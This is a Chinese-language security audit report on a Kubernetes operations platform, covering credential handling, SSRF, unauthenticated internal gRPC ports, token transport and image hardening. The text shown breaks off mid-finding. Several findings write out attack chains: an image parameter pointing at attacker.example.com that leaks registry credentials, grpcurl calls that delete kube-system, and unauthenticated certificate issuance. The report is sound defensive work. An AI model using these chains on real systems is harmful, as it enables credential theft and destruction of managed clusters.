# 14 安全审计（Security Audit）

- 审计对象：`/Users/wolf/Documents/project/autohealops`
- 审计方式：**只读**源码审计（未修改任何代码/配置/依赖，未安装依赖，未连接生产/测试环境，未对线上发请求，未执行 git 写操作）
- 范围：密钥与凭据、网络暴露面、注入面、文件操作、WS/SSE 鉴权、CORS/CSRF、SSRF 与内网探测、反序列化、日志泄露、前端安全、依赖与镜像
- 说明：`.env` 存在于工作区但**未被 git 跟踪**（`git ls-files | grep env` 仅返回 `.env.example` 与 `agent/examples/agent.env.example`）；本文只列键名与风险，不复述真实值。
- 结论口径：所有结论带 `文件:行`；无法确认的写「暂时无法确认」

---

## 1. 结论摘要（8 条）

1. **1 个 P0 级「任意登录用户可外泄平台凭据 + SSRF」**：`GET /api/v1/resources/registry/tags?image=<任意host>/repo` 只要 `require_any_user`，服务端会向该 host 发 `https://<host>/v2/<repo>/tags/list`，并且 `_resolve_creds` 在按 host 匹配失败后**回退到全局 `registry_username/password`**（`services/registry_service.py:71-74`）→ **凭据被 Basic Auth 发到攻击者主机**；`_fetch_token` 还会把同一份 creds 发到 401 响应里给的任意 `realm` URL（`registry_service.py:84-90`）。
2. **2 个 P0 级「内部端口零鉴权」**：`k8s-executor` 的 gRPC 9090 是 `grpc.NewServer()` 裸服务 + `reflection.Register` + 监听 `:9090`（`cmd/executor/main.go:95-98,109`），**任意能连到该端口的人 = 被管集群 cluster-admin**；`agent-gateway` 的内部 gRPC 9096 是**明文 + 无鉴权**，且提供 `IssueClientCert`（给任意 `cluster_id` 签发 agent 客户端证书）（`app/agent_gateway_service.py:68-83`）。
3. **NetworkPolicy 有明确缺口**：`k8s/networkpolicy.yaml` 只保护 `k8s-executor` 与 `ai-service`，**没有保护 agent-gateway（9095/9096）、api-server（8080）**；而 `docker-compose.yml` 把 `9090:9090`、`9000:9000` 发布到宿主所有网卡。
4. **密钥治理的最大问题是「一个密钥三用」**：`JWT_SECRET_KEY` 同时是用户 JWT 签名密钥、api-server→ai-service 的内部令牌、executor→api-server 回调令牌（`api/ai_proxy.py:23`、`clients/ai_client.py:28`、`api/alerts.py:539`、`k8s-executor/internal/config/config.go:66`、`ai-service/app/main.py:47`）。配置本身**无默认值**（`core/config.py:26,31,35` 均为必填），但 `.env.example` 给的是 `change-me` 占位符且**启动期没有强度校验**。
5. **凭据传输位置不安全**：WebSocket 终端与全部 SSE 都用 `?token=<JWT>`（`api/terminal.py:45`、`api/screens.py:31`、`api/stats.py:1441`、`api/workload_logs.py:288`），会被 nginx access log / 反代日志 / 浏览器历史记录完整留存；前端 JWT 存 `localStorage`（`frontend/src/App.tsx:67`、`components/TerminalModal.tsx:29`），一旦 XSS 即全量泄露（当前无明显 XSS 面，见 4.5）。
6. **注入面清理得比较干净**：Go 侧 K8s 操作全部走 client-go 结构化调用（不拼 shell），命令白名单 + 危险模式双重校验（`internal/executor/execute.go:104-127,224-236`）；Python 侧容器内命令有 `_bad_path` 限制（`api/resources.py:1216-1219`）；`yaml.safe_load` 全局使用；**无 pickle / 无 eval / 无 shell=True**（实测 grep）。
   唯一的命令拼接风险在 registry 侧（见结论 1）与 `kubectl` 风格字符串拼接（`resources.py:2457,2467,2634` 的 `f"cordon {node_name}"` 等，由 Go 侧 ParseCommand 分词，无 shell 解释，风险可控但建议改为结构化 API）。
7. **文件操作整体安全**：`/files` 只允许纯文件名并显式拦 `/\`、`.`、`..`（`internal/logstream/server.go:71-83`）；SFTP 有「白名单 + 黑名单」双校验并先 normpath（`api/host_terminal.py:499-514`）；容器内读文件限定只读命令 + 路径字符过滤。
8. **镜像与运行时硬化不足**：4 个 Dockerfile **全部以 root 运行**（无 `USER`）、基础镜像用 `alpine:latest` / `nginx:alpine`（无 digest 固定）、k8s Deployment 未设 `securityContext`（`runAsNonRoot`/`readOnlyRootFilesystem`/`drop ALL`）；Python 依赖已 `==` 锁定（18/19 行）。

---

## 2. 密钥与凭据

| 项 | 现状 | 证据 | 风险 |
|---|---|---|---|
| `JWT_SECRET_KEY` | 无代码默认值（必填）；`.env.example` 为 `change-me…` 占位符 | `core/config.py:26`、`.env.example:13` | 复制示例不改 = 可伪造任意 JWT；**无启动期强度/占位符校验**（全仓无相关检查） |
| `ENCRYPTION_KEY`（AES-256-GCM，加密 kubeconfig/DB 密码/主机私钥） | 无默认值；示例同为 `change-me…`；长度必须 32 字节否则 `AESGCM` 抛错 | `core/config.py:35`、`core/security.py:24-46`、`.env.example:18` | 同上；且 AES 密钥与 JWT 密钥同处一个 `.env`，泄露即「解密全部集群凭据 + 伪造身份」 |
| DB / Redis 口令 | 走 `DATABASE_URL` / `REDIS_URL` | `.env.example:7,10` | 单点文件 |
| 初始管理员口令 | `ADMIN_INITIAL_PASSWORD` 缺省为空 → 随机 12 字节并**打印到 WARNING 日志** | `core/config.py:39`、`main.py:39-55` | 凭据进日志聚合系统（P3，见 SEC-11） |
| 内部服务令牌 | ≡ `JWT_SECRET_KEY` | `api/ai_proxy.py:23`、`clients/ai_client.py:28`、`api/alerts.py:539,553`、`ai-service/app/main.py:47` | 见 SEC-04 |
| agent token | 每集群独立，存 `agent_token_hash`（sha256） | `agent_gateway.py:44-53`、`models/cluster.py` | 设计正确（哈希存储 + 常量凭证入 metadata） |
| `.env` 入库 | **未入库** | `git ls-files` 只返回 `.env.example` | 合规 |
| 示例配置含真实值 | 未发现真实主机/密钥；`192.168.6.99` 只出现在 `docker-compose.yml:1` 的注释与 `.env.example` 的注释里 | 实测 grep（`sk-`/`AKIA` 无命中） | 低 |
| k8s Secret | `k8s/secret.example.yaml` 为示例；`k8s/generated/` 被 `.gitignore:43` 忽略 | `git status` 无 tracked 生成物 | 合规；但**仓库内无 SealedSecret/外部密钥管理**，实际 secret 靠人工 apply |

**补充（正面）**：密码哈希用 bcrypt（`core/security.py:48-50`）；登出用 Redis 黑名单（`api/auth.py:158-166`）；agent 证书由平台 CA 签发、CA 私钥只在网关侧（`services/agent_pki.py`）。

---

## 3. 网络暴露面

| 端口/服务 | 监听 | 鉴权 | k8s 保护 | 证据 | 判定 |
|---|---|---|---|---|---|
| api-server :8080 | `0.0.0.0` | JWT（逐路由） | **无 NetworkPolicy** | `api-server/Dockerfile:16`、`start.sh:97-116`、`k8s/networkpolicy.yaml`（未选 api-server） | 集群内任意 Pod 可访问 `/mcp` 等未在 Ingress 暴露的路径 |
| k8s-executor :9090 gRPC | `:9090` 全接口 | **无**（`grpc.NewServer()` 无拦截器）+ 开 reflection | NetworkPolicy 仅允许 `app=api-server` 入站 | `cmd/executor/main.go:95-98,109`、`k8s/networkpolicy.yaml:4-16` | k8s 内受保护；**compose/本地形态 = 裸奔**（`docker-compose.yml:23` 映射到宿主） |
| k8s-executor :9099 HTTP（/logs /files /prom/range /watch） | `0.0.0.0` | **无** | 同上（同一 Pod 的 NP 覆盖全部端口） | `internal/logstream/server.go:44-52` | 本地/非 k8s 形态可被同网段任意读取 Pod 日志 |
| agent-gateway :9095（mTLS） | `0.0.0.0` | mTLS（`require_client_auth=True`） | **无 NetworkPolicy** | `app/agent_gateway.py:398-406`、`k8s/services.yaml:73-82` | 需持有 CA 签发证书 |
| agent-gateway :9096（内部 gRPC） | `0.0.0.0` | **无（明文）** | **无 NetworkPolicy** | `app/agent_gateway_service.py:87-95` | **集群内任意 Pod 可 `TunnelCall` 任意 method / `IssueClientCert`** |
| ai-service :9000 | `0.0.0.0` | `X-Internal-Token`（≡JWT 密钥） | NP 仅 api-server | `ai-service/app/main.py:37-48`、`k8s/networkpolicy.yaml:18-31` | 可接受（前提：密钥不泄） |
| frontend :80 | `0.0.0.0` | 静态资源 | 无 NP | `frontend/nginx.conf:1-19` | 低 |
| api-server `/metrics` | 同 8080 | **无** | 无 | `main.py:618-660` | 泄露集群数/告警数/成本（P3） |

**结论**：真正危险的是「9090 无鉴权」与「9096 无鉴权且无 NP」——两者都等于**被管集群的完全控制权**。前者在 k8s 里靠 NetworkPolicy 兜底（依赖 CNI 强制），后者**完全没有兜底**（`k8s/networkpolicy.yaml` 无 agent-gateway 的 podSelector）。

---

## 4. 各类注入面

### 4.1 SQL 注入

- 平台自身 SQL 全部走 SQLAlchemy 参数化（`text(...)` 只用于保留期清理等固定语句，表名来自常量；例 `services/data_retention_service.py:33,56`、`services/metrics_rollup.py:116`）。
- 少量 f-string 拼表名/库名的位置在**方言层**（`services/dialects/mysql.py:528,531,568,732`、`dialects/oracle.py:336-343`）：`{db}`/`{t}` 来自服务端 introspection 结果或经 `_check_ident`（`db_connections.py:689-692`）校验；属**受控拼接**，暂未发现用户直达路径。
- **审计的用户 SQL 执行**（`/db-connections/{id}/exec`、`/query`）本质就是「执行任意 SQL」，属产品能力，靠 admin + confirm + 审批 + 审计四重限制（`db_connections.py:1312-1348`）。

### 4.2 命令注入

| 位置 | 判定 | 证据 |
|---|---|---|
| K8s 操作（Go） | 安全：client-go 结构化调用；`ParseCommand` 分词 + 白名单 + `SafetyCheck` | `internal/executor/execute.go:104-127,224-236`、`dispatch` |
| 容器内 exec（Python→agent） | 单命令不经 shell（`exec_in_pod`），路径参数有 `_bad_path` | `api/resources.py:1216-1219`、`tool_registry.py:1299-1312` |
| `pod_logs` 拼 `tail -n 2000 {fpath}` | `_safe_path` 过滤 | `utils/pod_logs.py:252-255` |
| `resources.py` 拼 `cordon {node_name}` 等 | 值来自 URL path，进 Go 分词器，无 shell 解释；**但 node 名含空格可改变参数结构** | `resources.py:2457,2467,2484,2634` |
| **`custom_tasks` script → `/bin/sh -c`** | **任意命令**（见 13 报告 PERM-02） | `internal/script/runner.go:53` |
| `subprocess.run([...])`（Oracle 客户端解包） | 列表参数，无 shell | `services/oracle_client_service.py:256,281,289` |
| `os.system` / `shell=True` | **全仓 0 命中** | grep 实测 |

### 4.3 模板注入 / SSTI

未发现用户输入进入 `jinja2`/`render_template_string` 的路径；前端无模板渲染后端。判定：**无**。

### 4.4 SSRF（重点）

| 入口 | 可控性 | 证据 | 等级 |
|---|---|---|---|
| **`GET /resources/registry/tags?image=`** | **任意登录用户，host 完全可控** | `api/resources.py:2162-2170` → `services/registry_service.py:166-215`（`https://{h}/v2/{repo}/tags/list`） | **P0**（SEC-01） |
| `_fetch_token(realm)` | 由**远端** 401 响应决定（攻击者可控 realm） | `registry_service.py:84-90` | P0 同源 |
| Prometheus / ES 地址 | admin 配置（`system_settings`/`.env`） | `services/prometheus_service.py`、`services/es_client.py:13-35` | P3（SEC-12） |
| AI `base_url` | admin 配置（DB `ai_model_configs`） | `ai-service/app/services/model_adapter.py` | P3 |
| LDAP `host/port` | admin 配置 | `api/auth.py:73-99` | P3 |
| DB 连接 `host/port` | **admin** 才能建连接（`db_connections.py:288`），但 `GET /{id}/test` 任何登录用户可触发 | `db_connections.py:1613-1622` | P2（SEC-12 + 13 报告 PERM-14） |
| Webhook URL（钉钉/企微/飞书） | admin 配置 | `services/notification_service.py` | P3 |

### 4.5 XSS / 前端

- 无 `dangerouslySetInnerHTML`、无 `eval`/`new Function`（实测 grep 0 命中）。
- 无外部 CDN：`frontend/index.html` 仅引 `/src/main.tsx`；nginx 同源托管。
- JWT + user 存 `localStorage`（`App.tsx:67,77`、`TerminalModal.tsx:29`），无 HttpOnly Cookie → **任一 XSS 即完全接管**；同时无法防 CSRF 但也无需 CSRF token（认证靠 Authorization 头）。

### 4.6 反序列化 / XXE / YAML / pickle

- `yaml.safe_load` 全量使用（`api/resources.py:2206` 等；`grep "yaml.load(" == 0`）→ 无 RCE。
- 无 `pickle.loads`、无 `marshal`、无 Java 反序列化入口（Go/Python 栈）。
- 无 XML 解析入口（无 lxml/ElementTree 使用），XXE 不适用。
- JSON 解析全部走标准库/框架默认，未见 `object_hook` 自定义。

### 4.7 文件操作

| 入口 | 防护 | 证据 |
|---|---|---|
| executor `/files?path=` | 拒绝含 `/\`、`.`、`..`，仅 `ArtifactDir` 下纯文件名 | `internal/logstream/server.go:71-83` |
| SFTP list/read/write/upload/delete | `_path_allowed`：先 `normpath`，黑名单（`/etc,/boot,/dev,/proc,/sys,/root/.ssh`）+ 白名单（`/tmp,/var/tmp,/home`），可用系统设置覆盖 | `api/host_terminal.py:499-514`、`508-513` |
| 容器内文件下载 | `_bad_path`（禁空格/引号）+ 只读命令 | `api/resources.py:1207-1244` |
| 会话录像回放 | 仅 admin + `host_access(view)` | `api/host_terminal.py:413-419,454-461` |
| DB 导出下载 | 一次性 token + 过期 + 用后置废 | `api/db_approvals.py:319-336` |
| 诊断会话正文 | 落 JSONL 文件，路径由 `session_id` 拼（非用户可控） | `services/agent_session_store.py`（`store.read_messages(session_id)`） |

结论：**未发现路径穿越/任意文件读**。

---

## 5. WebSocket / SSE 鉴权

| 通道 | 鉴权方式 | 资源校验 | 结论 |
|---|---|---|---|
| `WS /api/v1/ws/clusters/{cid}/namespaces/{ns}/pods/{pod}/exec` | `?token=` → `decode_jwt` + 用户 is_active（`terminal.py:22-32,45-50`） | ✅ `check_cluster_permission(...,"operate")`（51-54） | 可用；**token 在 URL**（SEC-05）；**未查 Redis 黑名单**（登出后仍可连到过期，`terminal.py` 无 blacklist 校验） |
| `WS /api/v1/ws/hosts/{id}/terminal` | 首帧 `{"type":"auth"}` 或 `?token=`（`host_terminal.py:139-152`） | ✅ `host_access(...,"operate")` | 同上，且**未查黑名单** |
| `WS /api/v1/ws/clusters/{cid}/.../pods/status` | token（`api/watch.py:40-48`） | ✅ read | — |
| `SSE /api/v1/stats/screen/stream` | `?token=` 或 Bearer，**查黑名单** | ❌ 无集群隔离（大屏本来就是全局） | — |
| `SSE /api/v1/stats/dashboard/stream` | 同上 | ❌ | — |
| `SSE /logs/stream`（workload_logs） | token 或 Bearer | ✅ 见文件内 `check_cluster_permission` | — |

未授权连接可能性：**无 token 或 token 无效即 4001/401 关闭**（`terminal.py:47-50`、`screens.py:36-38`），未发现未鉴权可连的通道。

---

## 6. CORS / CSRF

- api-server：显式白名单 + `allow_credentials=True`（`main.py:575-585`），默认白名单是 localhost 三个来源；生产需配 `CORS_ORIGINS`。**不是 `*`，可接受**。
- ai-service：`allow_origins=["*"]` + `allow_credentials=True`（`ai-service/app/main.py:59-64`）——浏览器规范下该组合无效（不会带凭据），但意图过宽；且 ai-service 不该被浏览器直连（有内部 token 中间件兜底）。P2。
- CSRF：认证全走 `Authorization: Bearer`（非 Cookie），浏览器不会自动携带 → **CSRF 不适用**。外部接入用 `X-External-Token` 头（`external_access.py:23-27`），同样不受 CSRF 影响。

---

## 7. 日志泄露

| 位置 | 内容 | 判定 |
|---|---|---|
| `main.py:54` | 新建默认用户时打印**明文初始密码** | P3（SEC-11） |
| `api/terminal.py`、`screens.py`、`stats.py` | WS/SSE 的 token 在 URL → nginx `access_log` 记录完整 query | P1（SEC-05） |
| `services/feishu_service.py:55-57` | 只打印 `app_id[:8]` + 错误信息 | 合规 |
| `db_connections.py:337-370` | 审计只记 `sql[:500]` 摘要，**不落结果** | 合规（好实践） |
| `middleware/auth.py:35` | Redis 失败时 warning 含异常（不含 token） | 合规 |
| `unhandled_exception_handler` | 只回「服务器内部错误」，细节进日志 | 合规 |
| `backup-cronjob.yaml:54` | `MYSQL_PWD="$MYSQL_PASSWORD" mysqldump` → 密码进入进程 argv，节点上 `ps` 可见 | P3 |

未发现「打印 JWT / 明文密码 / 完整 SQL 结果」的代码路径（`grep logger.*password|token` 逐个复核）。

---

## 8. 依赖与镜像

| 项 | 现状 | 证据 | 风险 |
|---|---|---|---|
| 以 root 运行 | 4 个 Dockerfile 均无 `USER` | `api-server/Dockerfile:1-16`、`ai-service/Dockerfile:1-14`、`k8s-executor/Dockerfile:1-25`、`frontend/Dockerfile:1-14` | P2（容器逃逸后直接 root、可写 rootfs） |
| 基础镜像 | `alpine:latest`、`nginx:alpine`、`node:20-alpine`、`python:3.11-slim`（未 pin digest） | 同上 | P2（供应链漂移，重建即变更） |
| securityContext | Deployments 未见 `runAsNonRoot/readOnlyRootFilesystem/allowPrivilegeEscalation:false/capabilities.drop` | `k8s/deployments.yaml`（全文未见） | P2 |
| Python 依赖 | 已 `==` 锁定（19 行中 18 行带 `==`） | `api-server/requirements.txt` | 合规 |
| Node 依赖 | `npm install`（非 `npm ci`）；`frontend/package-lock.json` **存在且已跟踪** | `frontend/Dockerfile:5`、`git ls-files frontend \| grep lock` | P3（`npm install` 可能按 semver 更新锁文件，构建不完全可复现；建议改 `npm ci`） |
| secrets 进镜像 | 未 COPY `.env`；只 COPY `app/`、`alembic/`、`requirements.txt` | 各 Dockerfile | 合规；但**本地 `build` 后镜像层会包含 `alembic/versions` 等非敏感内容**，可接受 |
| executor 镜像额外拉取 | 构建期从 GitHub 下载 `grpc_health_probe` 未校验 sha256 | `k8s-executor/Dockerfile:19-22` | P3 |
| agent 权限 | ClusterRole `*/*` + impersonate（安装模板） | `api/clusters.py:441-467`（ARCH-13） | P2（已在前序报告） |

---

## 9. 问题清单

```
问题编号：SEC-01
问题名称：registry/tags 反射型 SSRF + 全局镜像仓库凭据外泄（任意登录用户）
问题等级：P0
所属模块：资源查询 / 镜像仓库
问题描述：
  GET /api/v1/resources/registry/tags 只要求 require_any_user，参数 image 由用户完全控制：
      host, repo, cur = parse_image_ref(image)
      ...
      url = f"https://{h}/v2/{repo}/tags/list?n={n}"
      async with httpx.AsyncClient(trust_env=False, timeout=20) as client:
          r = await client.get(url, auth=creds)
  （services/registry_service.py:173,194-197）
  凭据解析链 _resolve_creds 在「按 host 精确匹配失败」后**回退到全局账号**：
      user = await get_setting("registry_username", "")
      if user:
          pwd = await get_setting("registry_password", "") or ""
          return (user, pwd)          # ← 不校验 host
  （services/registry_service.py:71-74）
  于是 image 传 `attacker.example.com/x` 时，平台会用**全局仓库账号**对攻击者域名发
  HTTP Basic 认证 → 凭据直接落入对方 access log。
  同一 creds 还会被 `_fetch_token` 发往 401 响应里任意 `realm`：
      r = await client.get(realm, params=params, auth=creds)
  （services/registry_service.py:84-90）
  另外该接口不校验 cluster_id 归属，也不在 resources.py 的 77 个 _deny_cluster 守卫之内。
代码位置：
  api-server/app/api/resources.py:2162-2170
  api-server/app/services/registry_service.py:44-54（env 凭据）、57-81（_resolve_creds 全局回退）、
  84-97（_fetch_token 任意 realm）、166-215（list_tags）
涉及函数或类：registry_tags、list_tags、_resolve_creds、_creds_from_env、_fetch_token、_creds_from_cluster
调用链：
  任意登录用户 → GET /api/v1/resources/registry/tags?image=attacker.example.com/anything:latest
  → _resolve_creds("attacker.example.com") → 全局 registry 账号 → httpx GET
    https://attacker.example.com/v2/anything/tags/list  (Authorization: Basic <全局账号>)
  → 攻击者侧记录凭据；同时可通过错误回显探测内网 443 服务
根本原因：
  1) 「凭据自动匹配」被实现为「匹配不上就用全局」，缺少 host 白名单；
  2) 允许任意 host 的 outbound 请求（无 egress 白名单）；
  3) 该接口被当作纯读接口，未纳入资源级授权与审计。
可能影响：
  - 平台统一镜像仓库（Harbor/SWR/ACR）只读或读写账号泄露 → 可拉取全部私有镜像、
    可推送恶意镜像到被管集群；
  - 半盲 SSRF：可对内网任意 host:443 发请求，错误信息回显 `r.text[:200]` 与状态码
    （registry_service.py:207），可用于内网服务发现/指纹。
修改建议：
  1) 增加 registry host 白名单（系统设置），不在白名单直接 400；
  2) `_resolve_creds` 删除「全局回退」分支，或仅在 host ∈ 白名单时使用全局账号；
  3) `_fetch_token` 的 realm 必须与目标 host 同域（或同样走白名单）；
  4) 该接口加 `check_cluster_permission`（当传 cluster_id 时）并写 audit；
  5) 出方向 egress 策略：api-server 只允许访问配置好的仓库域名。
验证方法：
  1) 配一个全局 registry 账号；2) 起一台带有效证书的测试域名抓请求；
  3) 用 viewer 账号请求 image=<测试域名>/x，观察是否收到 Basic 认证头。
是否需要立即处理：是
```

```
问题编号：SEC-02
问题名称：k8s-executor gRPC 9090 无任何鉴权且开启 reflection，等于被管集群 cluster-admin
问题等级：P0
所属模块：k8s-executor / 网络暴露
问题描述：
  executor 的 gRPC server 是裸构造，无 unary/stream 拦截器：
      grpcServer := grpc.NewServer()
      pb.RegisterExecutorServiceServer(grpcServer, server)
      reflection.Register(grpcServer)
      ...
      lis, err := net.Listen("tcp", ":"+cfg.GRPCPort)     // 全接口
  （k8s-executor/cmd/executor/main.go:95-98,109）
  ExecutorService 覆盖 DeleteResource / ExecuteCommand / ApplyWorkloadYaml / ScaleWorkload /
  ExecPodStream / RunScript / BatchExecute 等 30+ 方法，且 server.go 内没有任何
  token/证书校验（grep `metadata` 只用于取 trace_id，`internal/grpc/server.go:60-67`）。
  部署暴露面：
   - docker-compose 把 9090 发布到宿主所有网卡：`"9090:9090"`（docker-compose.yml:23）；
   - 本地 start.sh 直接跑 `./k8s-executor/bin/executor`（start.sh:125-144），监听 0.0.0.0；
   - k8s 里靠 NetworkPolicy 仅允许 `app=api-server` 入站（k8s/networkpolicy.yaml:4-16）——依赖 CNI 强制。
代码位置：
  k8s-executor/cmd/executor/main.go:95-98,109
  k8s-executor/internal/grpc/server.go:40-140（getExecutor/ExecuteCommand/ExecutePlan 无鉴权）
  docker-compose.yml:19-26
  k8s/networkpolicy.yaml:1-16
涉及函数或类：execgrpc.NewServer、ExecutorService 全部 handler
调用链：
  任意能连 :9090 的进程 → grpcurl -plaintext <host>:9090 list（reflection）
  → executor.ExecutorService/DeleteResource {cluster_id:1, kind:"namespace", name:"kube-system"}
  → 该集群资源被删除
根本原因：内部服务按「可信内网」设计，把鉴权完全交给网络层；网络层只在 k8s 形态成立。
可能影响：
  - 拿到执行器 = 拿到所有直连集群的 kubeconfig 权限（cluster-admin 级），
    可删除 namespace、改 Deployment、exec 进任意 Pod；
  - reflection 打开使攻击面自描述（无需 proto 文件）；
  - compose/本地部署等于把集群控制面暴露给同网段。
修改建议：
  1) gRPC 加 `X-Internal-Token`（独立密钥）unary/stream 拦截器；
  2) 关闭 reflection（或仅 debug 构建开启）；
  3) 默认监听 127.0.0.1，容器内用 0.0.0.0 并靠 NP 兜底；
  4) compose 不发布 9090（改为 `expose`），本地调试再显式映射到 127.0.0.1。
验证方法：
  无凭据执行 `grpcurl -plaintext <host>:9090 list`，修复前返回服务列表，修复后 Unauthenticated。
是否需要立即处理：是
```

```
问题编号：SEC-03
问题名称：agent-gateway 内部 gRPC 9096 明文无鉴权，可签发任意集群 agent 证书 / 下发任意 RPC
问题等级：P0
所属模块：Agent 网关
问题描述：
  AgentGatewayInternalServicer 暴露 4 个方法，全程无鉴权：
   - TunnelCall(cluster_id, method, payload)  → agent_gateway.call(...)      # 任意 RPC 下发
   - TunnelStreamCall(...)                     → 流式执行（可走 ExecPodStream）
   - IsConnected(...)
   - IssueClientCert(cluster_id, days)         → agent_pki.issue_client_cert(...)  # 签发客户端证书
  （api-server/app/agent_gateway_service.py:27-83）
  服务以明文启动：
      server.add_insecure_port(addr)     # addr = :9096
  （agent_gateway_service.py:87-95）
  而 k8s/networkpolicy.yaml 只保护 k8s-executor 与 ai-service，**没有选中 agent-gateway**，
  且 services.yaml 把 9096 暴露为 ClusterIP（k8s/services.yaml:84-97）→ 集群内任意 Pod 可达。
  另外 `IssueClientCert` 直接按请求里的 cluster_id 签发（不校验调用者身份、
  不校验该集群是否已登记），返回 cert_pem + key_pem + ca_pem。
代码位置：
  api-server/app/agent_gateway_service.py:27-83（4 个 RPC）、87-95（明文监听）
  k8s/services.yaml:73-97（9095/9096 ClusterIP）
  k8s/networkpolicy.yaml（无 agent-gateway 策略）
涉及函数或类：AgentGatewayInternalServicer.TunnelCall / TunnelStreamCall / IssueClientCert、start_internal_server
调用链（两条）：
  A) 执行：任意 Pod → grpc :9096 TunnelCall{cluster_id:1, method:"DeleteResource",
     payload:'{"kind":"deployment","namespace":"prod","name":"api"}'} → agent 在集群内执行
  B) 取证书：任意 Pod → IssueClientCert{cluster_id:1} → 拿到 mTLS 客户端证书
     → 连接 :9095（此时证书链合法）→ 若再拿到该集群 agent token 即可完全冒充 agent；
     即使拿不到 token，也已泄露「可被 CA 认可」的私钥材料，且可对 9095 做可信客户端探测
根本原因：
  1) 「内部网关」假设只有 api-server 会连它（假设未落到 NP）；
  2) 证书签发接口没有与「调用者身份」绑定（本应只有 admin 在平台 UI 触发的接入流程才签）。
可能影响：
  - 直接绕过 api-server 的全部 RBAC/审批，对任意 agent 集群下发任意 RPC（等效 cluster-admin）；
  - 任意集群的「合法」agent 私钥可被批量签发，mTLS 信任模型失效；
  - 无审计、无来源记录。
修改建议：
  1) 9096 加 mTLS 或独立 `X-Internal-Token` 拦截器（不要复用 JWT 密钥）；
  2) `IssueClientCert` 拆到独立 admin-only 通道（或改为由 api-server 侧签、网关只导出 CSR 签名）；
  3) 给 agent-gateway 加 NetworkPolicy（ingress 仅 api-server + 被管集群 agent 的出口 IP/端口）。
验证方法：
  在集群内起一个临时 Pod，`grpcurl -plaintext agent-gateway:9096 list` 应成功（当前）；
  调 IssueClientCert 应返回证书（当前）；修复后两者都应 Unauthenticated。
是否需要立即处理：是
```

```
问题编号：SEC-04
问题名称：JWT 签名密钥复用为内部服务令牌，且示例配置为占位符、启动期无校验
问题等级：P1
所属模块：密钥治理 / 服务间鉴权
问题描述：
  同一个 `JWT_SECRET_KEY` 被用于四种信任域：
   1) 用户 JWT 签名（core/security.py:56-62）；
   2) api-server → ai-service 的 X-Internal-Token（api/ai_proxy.py:23、clients/ai_client.py:28）；
   3) executor → api-server 回调（api/alerts.py:539,553；Go 侧 internal/config/config.go:66）；
   4) 平台 → ai-service 的服务身份（ai-service/app/main.py:46-48）。
  `.env.example:13` 给出 `change-me…` 占位符，而 `core/config.py:26` 只要求「非空」，
  **没有任何启动期强度/占位符校验**（全仓 grep 无相关检查）→ 直接复制示例部署即等于
  「公开的 JWT 密钥」。
代码位置：
  api-server/app/core/security.py:53-62
  api-server/app/api/ai_proxy.py:23
  api-server/app/clients/ai_client.py:28
  api-server/app/api/alerts.py:536-545
  ai-service/app/main.py:37-48
  api-server/app/core/config.py:26
  .env.example:13-18
涉及函数或类：create_jwt、decode_jwt、_internal_headers、internal_auth_middleware
调用链：
  持有该密钥者 → forge JWT{sub:1,role:"admin"} → 全平台 admin；
  或直接 POST /api/v1/alerts/1/auto-process + X-Internal-Token → 触发自动诊断修复链
根本原因：为少配一个密钥而复用；缺「配置自检」环节。
可能影响：密钥泄露的影响面从「会话伪造」扩大为「内部服务全量调用 + 自动修复触发」。
修改建议：
  1) 引入独立 `INTERNAL_API_TOKEN`（可轮换），逐步替换 4 处；
  2) 启动自检：密钥长度 ≥32、不等于示例值、不等于已知弱值，否则拒绝启动（fail-fast）；
  3) `alerts.py`、`ai-service/main.py` 的 token 比较改 `secrets.compare_digest`。
验证方法：以 `.env.example` 为模板直接启动，应被拒绝（当前可正常启动）。
是否需要立即处理：是
```

```
问题编号：SEC-05
问题名称：JWT 经 URL query 传输（WS/SSE）+ 前端 localStorage 存储，凭据易泄露
问题等级：P1
所属模块：前端 / 通道鉴权
问题描述：
  - WS 终端：`token = websocket.query_params.get("token", "")`（api/terminal.py:45、
    api/host_terminal.py:140）；
  - SSE：screens.py:31、stats.py:1441、workload_logs.py:288 均为 `?token=`；
  - 前端把 JWT 存 localStorage：App.tsx:67、TerminalModal.tsx:29、WorkloadLogsModal.tsx:68,134,271、
    components/trace/api.ts:77。
  URL 中的 token 会进入：nginx access_log（frontend/nginx.conf 默认 log_format 含 $request）、
  反代/网关日志、浏览器历史、Referer（同源请求会带完整 URL 作为 Referer）。
  另外这两条 WS 路径**未校验 Redis 黑名单**（terminal.py:22-32 只 decode_jwt + is_active），
  登出后 token 仍可建立新终端直到过期。
代码位置：
  api-server/app/api/terminal.py:22-32,45
  api-server/app/api/host_terminal.py:139-142
  api-server/app/api/screens.py:26-38
  api-server/app/api/stats.py:1439-1450
  api-server/app/api/workload_logs.py:277-292
  frontend/src/App.tsx:67,73-77、components/TerminalModal.tsx:29
涉及函数或类：ws_exec_pod、ws_host_terminal、screen_stream、dashboard_stream、_resolve_user
调用链：浏览器 → wss://host/api/v1/ws/...?token=eyJ... → nginx 记录完整 URL → 日志可读即 token 可读
根本原因：EventSource/WebSocket 无法自定义头，选择了最省事的 query 传 token。
可能影响：
  - 任何能读访问日志的人（运维、日志平台、ELK 权限过大者）可冒充任意用户（含 admin）；
  - 浏览器多标签/历史记录泄露；
  - 登出后终端仍可用（黑名单未覆盖）。
修改建议：
  1) 短期：WS 用「一次性 ticket」——前端先 `POST /ws-ticket` 换 60s 有效的一次性码，URL 只带 ticket；
  2) SSE 同理（或改用 fetch + ReadableStream，带 Authorization 头）；
  3) 两条 WS 路径补 Redis 黑名单校验；
  4) nginx 日志对 `token=`/`ticket=` 做掩码。
验证方法：登出后用旧 token 建 WS，应 4001；修复前可连接。
是否需要立即处理：是
```

```
问题编号：SEC-06
问题名称：logstream 9099 无鉴权（本地/非 k8s 形态可被同网段读取任意 Pod 日志）
问题等级：P1
所属模块：k8s-executor / 日志
问题描述：
  mux 注册 /logs /watch /prom/range /files 四个 handler，全文件无 Authorization/token 校验
  （internal/logstream/server.go:44-52；grep Authorization 无命中）。
  监听地址来自配置（默认 `http://localhost:9099` 供 api-server 用；executor 侧
  `cfg.LogStreamAddr` 默认 `:9099`），start.sh 直接跑二进制 → 0.0.0.0:9099。
  k8s 里由 NetworkPolicy（app=api-server 入站）兜底（k8s/networkpolicy.yaml:4-16）。
代码位置：
  k8s-executor/internal/logstream/server.go:44-52,71-83
  api-server/app/core/config.py:41（EXECUTOR_LOGSTREAM_ADDR 默认 localhost:9099）
  k8s/networkpolicy.yaml:1-16
涉及函数或类：logstream.Server.Start、handleLogs、handleFile、handlePromRange、handleWatch
调用链：任意 HTTP 客户端 → GET :9099/logs?cluster_id=1&namespace=prod&pod=api-xxx&follow=1
